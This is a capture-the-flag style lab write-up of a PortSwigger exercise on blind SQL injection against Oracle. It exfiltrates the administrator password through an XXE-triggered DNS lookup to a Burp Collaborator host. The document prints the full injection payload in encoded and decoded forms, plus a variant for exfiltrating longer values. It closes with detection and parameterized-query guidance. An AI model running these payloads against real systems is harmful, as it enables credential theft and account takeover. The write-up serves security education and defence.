# Lab 17: Blind SQL Injection with Out-of-Band Data Exfiltration

## Executive Summary

This lab represents the culmination of the blind SQL injection series and demonstrates the most operationally efficient data exfiltration technique available against a fully blind injection point: out-of-band credential extraction via DNS. Building directly on the OAST interaction technique established in Lab 16, this attack embeds a live SQL subquery — targeting the administrator password — directly inside the DNS hostname component of an XXE-triggered external entity lookup. The Oracle database resolves the entity by performing a DNS lookup where the queried subdomain is dynamically constructed from the administrator's plaintext password. Burp Collaborator receives the DNS query and exposes the full subdomain — including the embedded password — in the interaction log. Complete credential extraction is achieved in a single payload delivery with no timing inference, no character-by-character iteration, and no automated request batches. The administrator password is read directly from the DNS lookup hostname recorded in Collaborator.


## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection - Blind Out-of-Band Data Exfiltration |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Blind SQL Injection — Direct Credential Exfiltration via DNS Out-of-Band Channel |
| **Risk**               | Critical - Complete Credential Extraction via Single DNS Interaction |
| **Requires**           | Burp Suite Professional (Burp Collaborator) |
| **Completion**         | Documented — Burp Pro Required for Lab Execution |

## Objective

Extend the out-of-band interaction technique from Lab 16 to perform direct data exfiltration. Embed a SQL subquery targeting the administrator password inside the DNS hostname of an XXE-triggered external entity lookup. Retrieve the administrator password from the Burp Collaborator interaction log — specifically from the subdomain component of the DNS query recorded against the Collaborator listener — and use it to authenticate as administrator and achieve complete system compromise.

## Testing Setup

**Tools Required:**
- Burp Collaborator — DNS and HTTP listener providing unique subdomains; records all inbound interactions including full queried hostnames
- Burp Proxy for traffic interception
- Burp Repeater for payload delivery

**Target:** TrackingId cookie parameter on an Oracle backend executing SQL asynchronously. Database contains a `users` table with `username` and `password` columns. Administrator credentials are the extraction target.

**Relationship to Lab 16:**
Lab 16 established that the injection point exists, the database is Oracle, and the `xmltype()` XXE chain successfully triggers DNS interactions to Burp Collaborator. Lab 17 extends that confirmed technique by embedding a live SQL subquery into the DNS hostname itself, turning the interaction from a proof-of-concept into a complete data exfiltration primitive.

## Core Concept: DNS as a Data Exfiltration Channel

In Lab 16, the Collaborator subdomain in the payload was a static string — a fixed identifier used only to confirm that a DNS lookup occurred. The DNS query carried no data beyond the fact of its own existence.

In Lab 17, the subdomain is made dynamic. Instead of a fixed Collaborator subdomain, the SYSTEM URI is constructed to embed the result of a SQL subquery directly into the hostname:

```
Lab 16 (interaction only):
  DNS lookup: [unique-id].burpcollaborator.net
  Confirms: injection works
  Extracts: nothing

Lab 17 (data exfiltration):
  DNS lookup: [sql-query-result].[unique-id].burpcollaborator.net
  Confirms: injection works
  Extracts: the value of [sql-query-result] from the DNS hostname directly
```

When Oracle resolves the SYSTEM URI containing `(SELECT password FROM users WHERE username='administrator')||'.[unique-id].burpcollaborator.net'`, it evaluates the subquery, concatenates the password value with the Collaborator domain, and performs a DNS lookup against the resulting hostname. The full hostname — including the password as a subdomain label — is recorded by Collaborator and visible to the attacker in the Description tab.

This is the DNS equivalent of reading data from the error message in Lab 13, except the data arrives in the DNS query hostname rather than in the HTTP response body.

## Exploitation Walkthrough

### 1. Injection Point and Prior Context

The TrackingId cookie is the injection surface — identical to Lab 16. The Oracle backend executes the query asynchronously. Burp Collaborator is configured and a unique subdomain has been generated. All reconnaissance from Lab 16 applies directly: Oracle backend confirmed, `xmltype()` XXE chain confirmed to trigger DNS lookups, `users` table with `username` and `password` columns confirmed to exist.

**Inferred Backend Query:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]'
```

### 2. Data Exfiltration Payload Construction

The exfiltration payload builds on the Lab 16 structure with one critical modification: the SYSTEM URI hostname is no longer a static Collaborator subdomain. It is a concatenated string where the first label is the output of a SQL subquery targeting the administrator password.

**Full Attack Payload:**
```http
Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?>
<!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users
+WHERE+username%3d'administrator')||'.[COLLABORATOR-SUBDOMAIN]/">+%25remote%3b]>'),'/l')
+FROM+dual--
```

**URL-Decoded for Clarity:**
```sql
x' UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM
      "http://' || (SELECT password FROM users WHERE username='administrator') || '.[COLLABORATOR-SUBDOMAIN]/">
    %remote;
  ]>'),
  '/l'
) FROM dual--
```

**Payload Anatomy — Key Difference from Lab 16:**

| Component | Lab 16 Value | Lab 17 Value | Purpose |
|-----------|-------------|-------------|---------|
| SYSTEM URI host | `[COLLABORATOR-SUBDOMAIN]` | `'||(SELECT password FROM users WHERE username='administrator')||'.[COLLABORATOR-SUBDOMAIN]` | Embeds SQL subquery output as a DNS subdomain label |
| SQL subquery | None | `SELECT password FROM users WHERE username='administrator'` | Extracts administrator password |
| Concatenation | N/A | `||` on each side of subquery | Builds dynamic hostname from subquery result and Collaborator domain |

**How the Dynamic Hostname Is Constructed:**

Oracle evaluates the SYSTEM URI at entity resolution time. The `||` string concatenation operators cause Oracle to:

1. Execute `SELECT password FROM users WHERE username='administrator'` — returns the plaintext password
2. Concatenate the result with `.[COLLABORATOR-SUBDOMAIN]` — produces `[password].[unique-id].burpcollaborator.net`
3. Perform a DNS lookup against the constructed hostname
4. Collaborator records the full queried domain — the password is readable as the leftmost subdomain label

**Full SQL Query Executed on Oracle Backend:**
```sql
SELECT tracking_data FROM tracking WHERE id = 'x'
UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM
      "http://[administrator-password].[unique-id].burpcollaborator.net/">
    %remote;
  ]>'),
  '/l'
) FROM dual--'
```

At execution time, Oracle substitutes the subquery result into the SYSTEM URI string before passing it to the XML parser for entity resolution.

### 3. Payload Delivery

Forwarded the category filter request to Burp Repeater. Inserted the Collaborator subdomain using the "Insert Collaborator payload" right-click option. Sent the request.

**Response:** 200 OK — returned immediately.

No content difference, no timing signal, no error. Identical to Lab 16. The HTTP response provides no indication that anything occurred — confirmation arrives exclusively through Collaborator.

### 4. Password Extracted from Collaborator DNS Interaction

Navigated to the Burp Collaborator tab and clicked "Poll now". After a brief delay for asynchronous Oracle query execution and DNS propagation:

Collaborator displayed recorded DNS interactions. In the Description tab for the DNS interaction, the full queried hostname was visible:

```
[extracted-administrator-password].[unique-id].burpcollaborator.net
```

The leftmost subdomain label preceding the Collaborator domain is the administrator's plaintext password, embedded there by Oracle's SQL evaluation of the `SELECT password` subquery during external entity resolution.

**Credentials Extracted:**
- **Username:** `administrator`
- **Password:** `[value read from Collaborator DNS interaction Description tab]`

**Data exfiltration confirmed:** Complete administrator password retrieved in a single payload delivery via DNS out-of-band channel.

### 5. Administrator Account Compromise

Navigated to the application login page and authenticated using the credentials extracted from the Collaborator interaction.

**Credentials:**
- Username: `administrator`
- Password: `[extracted password]`

Full administrative access obtained. Complete system compromise achieved.

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.8)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

**Primary Vulnerabilities:**

**CWE-89: SQL Injection**
- TrackingId cookie value interpolated directly into Oracle SQL without parameterization
- UNION SELECT injection successful under fully asynchronous, no-feedback conditions
- Live SQL subquery executed; result exfiltrated via DNS in a single request

**CWE-611: Improper Restriction of XML External Entity Reference (XXE)**
- Oracle `xmltype()` processes attacker-supplied XML with unrestricted external entity resolution
- Entity resolution used as the active exfiltration channel — not merely a detection mechanism
- SQL subquery output embedded in the external entity URI and delivered in DNS query hostname

**CWE-200: Exposure of Sensitive Information to an Unauthorized Actor**
- Administrator plaintext password exfiltrated to attacker-controlled infrastructure
- Exfiltration occurs entirely outside the HTTP channel — no application-layer logging captures the data in transit
- DNS query logs at the network perimeter are the only potential detection point

**Complete Attack Chain:**

```
TrackingId Cookie — Confirmed Injection Surface (Lab 16)
        ↓
Asynchronous Execution — All Synchronous Channels Eliminated
        ↓
Oracle Backend + xmltype() XXE Chain Confirmed (Lab 16)
        ↓
Burp Collaborator Subdomain Generated
        ↓
SQL Subquery Embedded in SYSTEM URI via || Concatenation
        ↓
Payload Delivered — 200 OK Returned Immediately (No HTTP Signal)
        ↓
Oracle Evaluates Subquery → Administrator Password Value Retrieved
        ↓
Oracle Constructs DNS Hostname: [password].[collaborator-subdomain]
        ↓
Oracle XML Parser Resolves External Entity → DNS Lookup Initiated
        ↓
Collaborator Records DNS Query — Full Hostname Including Password Visible
        ↓
Password Extracted from Collaborator Description Tab
        ↓
Administrator Authentication → Complete System Compromise
```

**Efficiency Comparison — OAST vs. All Prior Blind Extraction Techniques:**

| Lab | Technique | Requests for Full Password | Time Estimate |
|-----|-----------|--------------------------|---------------|
| Lab 12 | Oracle Conditional Error — Cluster Bomb | 1,240+ | 2-4 hours |
| Lab 13 | PostgreSQL Visible CAST Error | 2 | Minutes |
| Lab 15 | PostgreSQL Time-Based Cluster Bomb | 720 | 2-3 hours |
| **Lab 17** | **Oracle OAST DNS Exfiltration** | **2** | **Minutes** |

Two requests: one to confirm the Oracle backend and injection point, one to extract the complete password. No iteration, no timing measurement, no automation required.

**Why DNS Subdomain Exfiltration Works:**

DNS label structure allows arbitrary strings as subdomain components — up to 63 characters per label and 253 characters for the full domain name. A typical password of 20 characters fits comfortably within a single DNS label. Oracle constructs the hostname dynamically and the DNS infrastructure resolves it as a standard lookup. The exfiltrated data is carried transparently in what appears to be a normal DNS query.

```
DNS query structure:
  [data-label].[collaborator-subdomain].[tld]

Example:
  s3cr3tpasswd.abc123xyz.burpcollaborator.net
```

**Handling Longer Data Values:**

For values exceeding the 63-character DNS label limit — API keys, session tokens, long hashes — the value can be split across multiple labels using additional concatenation:

```sql
-- Split exfiltration for values > 63 characters
"http://'||SUBSTR(password,1,30)||'.'||SUBSTR(password,31,30)||'.[COLLABORATOR]/"
```

For standard password lengths this is unnecessary. For full-table extraction, individual records are exfiltrated with multiple requests using `OFFSET` or `ROWNUM` filtering, each taking a single payload delivery.

**Real-World Detection and Egress Considerations:**

| Scenario | Impact on Attack |
|----------|-----------------|
| DNS egress unrestricted from DB server | Password exfiltrated — invisible to HTTP-layer monitoring |
| HTTP egress also permitted | Additional HTTP interaction recorded; higher-bandwidth exfiltration possible |
| DNS logging active at perimeter | DNS query to external domain from DB server appears as an anomaly — potential detection point |
| DB server restricted to internal DNS resolver only | OAST fails — time-based fallback required |
| interactsh or self-hosted OAST infrastructure | Alternative to Collaborator when Collaborator is blocked |

**Detection Opportunity:**
A database server performing DNS lookups against external random-string subdomains has no legitimate operational reason to do so. Network monitoring that alerts on database server DNS queries to non-approved destinations would detect this attack. This is a valid and implementable detection control for defenders — it does not prevent the underlying injection but creates an alert opportunity at the exfiltration step.

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Incremental capability building: OAST interaction proof-of-concept (Lab 16) before data exfiltration (Lab 17)
- SQL subquery embedding in DNS hostname via `||` string concatenation
- Collaborator polling and Description tab analysis for reading extracted data
- Understanding DNS label constraints and per-query data volume
- Complete attack chain from injection confirmation through credential extraction and authentication

**Critical Security Insights:**

**1. OAST Data Exfiltration Is the Most Operationally Efficient Blind Technique When Available:**
The contrast with time-based extraction makes this unambiguous. Lab 15 required 720 serialized requests over hours to extract a 20-character password. Lab 17 achieves the same result in two requests in minutes. Where Collaborator is available and DNS egress is permitted from the database server, OAST exfiltration should be the first technique attempted against a blind injection point.

**2. The HTTP Response Carries Zero Information — DNS Does All the Work:**
Both requests return identical 200 OK responses with identical content. Every piece of extracted data arrives exclusively through Collaborator. An analyst reviewing HTTP traffic alone would see two completely normal requests with normal responses. The attack is invisible to HTTP-layer monitoring. DNS-level monitoring is the only detection layer that observes the actual exfiltration.

**3. Plaintext Password Storage Amplifies Impact Directly:**
DNS label exfiltration works because the password is a compact string fitting inside a 63-character label. If passwords were stored as bcrypt hashes, the hash value would still exfiltrate — it just would not provide direct authentication capability without cracking. Plaintext or reversibly-encrypted password storage converts credential exposure into immediate account takeover. The combination of SQL injection, OAST exfiltration, and plaintext passwords represents worst-case credential security posture.

**4. Database Server Egress Controls Are a Required Defense Layer:**
Parameterized queries eliminate the injection. Network egress filtering restricting database server DNS queries to approved internal resolvers eliminates the out-of-band exfiltration channel. Both controls are necessary for a complete security posture. A database server has no legitimate need to resolve arbitrary external DNS names and should be restricted accordingly.

**5. The Complete SQL Injection Technique Hierarchy — Series Summary:**

| Condition | Technique | Lab |
|-----------|-----------|-----|
| Error messages visible in response | Conditional error-based (CASE / TO_CHAR) | Lab 12 |
| Verbose errors reflect data | CAST type mismatch extraction | Lab 13 |
| No output, synchronous, confirmation only | Time-based pg_sleep | Lab 14 |
| No output, synchronous, full extraction | Time-based Cluster Bomb | Lab 15 |
| No output, asynchronous, confirmation only | OAST DNS interaction | Lab 16 |
| No output, asynchronous, full extraction | OAST DNS data exfiltration | Lab 17 |

Technique selection is determined entirely by what feedback channels are available. OAST is the most efficient when viable. Time-based is the universal fallback. Every technique in this hierarchy is eliminated by parameterized queries at the code level — no detection or network control prevents the injection itself.

**6. One Line of Code Eliminates This Entire Series:**

```sql
-- Vulnerable — enables every technique across Labs 12-17
query = "SELECT data FROM tracking WHERE id = '" + tracking_id + "'"
cursor.execute(query)

-- Secure — eliminates every technique across Labs 12-17
query = "SELECT data FROM tracking WHERE id = :id"
cursor.execute(query, {"id": tracking_id})
```

Parameterized queries are not a mitigation — they eliminate the attack surface. No network control, WAF rule, egress filter, error suppression measure, or response time normalization addresses the root cause. The answer to every lab across this SQL injection series is the same single architectural decision: separate SQL structure from user-supplied data at the driver level.

## References

1. PortSwigger Web Security Academy - Blind SQL Injection with Out-of-Band Data Exfiltration
2. PortSwigger Web Security Academy - SQL Injection Cheat Sheet (OAST Payloads)
3. PortSwigger Documentation - Burp Collaborator
4. OWASP Top 10 (2021) - A03: Injection
5. CWE-89 - Improper Neutralization of Special Elements used in an SQL Command
6. CWE-611 - Improper Restriction of XML External Entity Reference
7. CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor
8. Oracle Documentation - XMLType, EXTRACTVALUE, and External Entity Resolution
9. OWASP SQL Injection Prevention Cheat Sheet
10. OWASP Testing Guide - Testing for Out-of-Band SQL Injection (OTG-INPVAL-005)

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Using out-of-band data exfiltration techniques, DNS-based credential extraction, or Burp Collaborator infrastructure against systems without explicit written authorization is illegal under applicable laws worldwide.
